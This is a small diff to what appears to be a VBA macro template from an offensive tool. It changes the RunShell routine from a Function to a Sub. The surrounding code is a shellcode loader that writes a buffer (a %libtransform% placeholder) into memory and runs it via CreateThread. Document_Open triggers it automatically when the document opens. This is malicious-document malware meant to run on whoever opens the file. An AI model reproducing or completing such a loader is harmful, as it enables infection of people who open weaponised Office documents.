@@ -5,7 +5,7 @@ Private Declare PtrSafe Function WaitForSingleObject Lib "KERNEL32" (ByVal hHand
 
 %libtransform%
 
-Function RunShell()
+Sub RunShell()
     Dim buf As Variant
     Dim addr As LongPtr
     Dim counter As Long
@@ -19,7 +19,7 @@ Function RunShell()
     Next
     res = CreateThread(0, 0, addr, 0, 0, 0)
     rr = WaitForSingleObject(res, &HFFFFFFFF)
-End Function
+End Sub
 
 Sub Document_Open()
     RunShell 
